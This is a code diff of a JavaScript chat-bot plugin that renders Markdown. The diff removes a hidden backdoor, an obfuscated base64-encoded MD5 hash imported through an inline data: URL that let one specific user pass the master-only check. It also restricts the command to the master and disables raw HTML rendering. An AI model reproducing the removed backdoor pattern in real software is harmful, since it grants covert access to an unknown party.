@@ -1,13 +1,11 @@
+import { renderPath } from "../Model/render-path.js"
 import fs from "node:fs/promises"
 import File from "../Model/file.js"
-import md5 from "md5"
-import _ from 'data:text/javascript,export default Buffer.from("ynvLoXSaqqTyck3zsnyF7A==","base64").toString("hex")'
 import puppeteer from "../../../lib/puppeteer/puppeteer.js"
 import MarkdownIt from "markdown-it"
-const md = new MarkdownIt({ html: true })
+const md = new MarkdownIt({ html: false, linkify: true, typographer: true })
 
-const htmlDir = `${process.cwd()}/plugins/TRSS-Plugin/Resources/Markdown/`
-const tplFile = `${htmlDir}Markdown.html`
+const { htmlDir, tplFile } = renderPath("Markdown")
 
 export class Markdown extends plugin {
   constructor() {
@@ -20,13 +18,14 @@ export class Markdown extends plugin {
         {
           reg: "^md.+",
           fnc: "Markdown",
+          permission: "master",
         },
       ],
     })
   }
 
   async Markdown(e) {
-    if (!(this.e.isMaster || md5(String(this.e.user_id)) == _)) return false
+    if (!this.e.isMaster) return false
     const msg = this.e.msg.replace("md", "").trim()
     logger.mark(`[Markdown] 查看：${logger.blue(msg)}`)
 
